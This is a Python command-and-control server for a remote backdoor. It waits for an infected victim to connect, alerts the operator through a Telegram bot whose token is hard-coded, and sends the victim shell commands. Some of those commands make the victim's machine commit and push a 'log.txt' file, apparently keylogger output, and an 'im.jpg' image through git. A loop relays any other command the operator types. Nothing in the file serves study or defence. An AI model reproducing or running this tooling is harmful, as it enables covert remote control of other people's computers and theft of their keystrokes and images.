import socket
import sys
import requests
import time

# Create socket (allows two computers to connect)
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Bind socket to port (the host and port the communication will take place) and wait for connection from client
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        socket_bind()


# Establish connection with client (socket must be listening for them)
def socket_accept():
    conn, address = s.accept()
    print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
    str1="Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1])
    url='https://api.telegram.org/bot452373832:AAGauK8mHnS_H401kn5887JwCTGZo_MhM80/sendMessage?chat_id=582942300&text=hey'+str1
    requests.get(url)
    send(conn)
    send_commands(conn)
    conn.close()
def ss(conn,cmd):
    try:
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            d=conn.recv(40960)
            client_response = str(d, "utf-8")
            print(client_response, end="")
    except:
        print("Error sending commands")
   
        
def send(conn):
    ss(conn,"cd C:\\Users\\hp\\Documents\\Bank Management C++\\banksystem C++")
    time.sleep(2)
    ss(conn,"git add log.txt")
    time.sleep(2)
    ss(conn,"git commit -m '1'")
    time.sleep(2)
    ss(conn,"git push")

def img(conn):
    ss(conn,"cd C:\\Users\\hp\\Documents\\Bank Management C++\\banksystem C++")
    time.sleep(2)
    ss(conn,"git add im.jpg")
    time.sleep(2)
    ss(conn,"git commit -m 'im'")
    time.sleep(2)
    ss(conn,"git push")

# Send commands
def send_commands(conn):
    while True:
        try:
            for i in range(0,5):
                time.sleep(1)
            cmd='test'
        except KeyboardInterrupt:
            cmd=input('>')
        if cmd == 'i':
            img(conn)   
            continue
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(40960), "utf-8")
            if client_response=='test':
                continue
            print(client_response, end="")


def main():
    socket_create()
    socket_bind()
    socket_accept()


main()
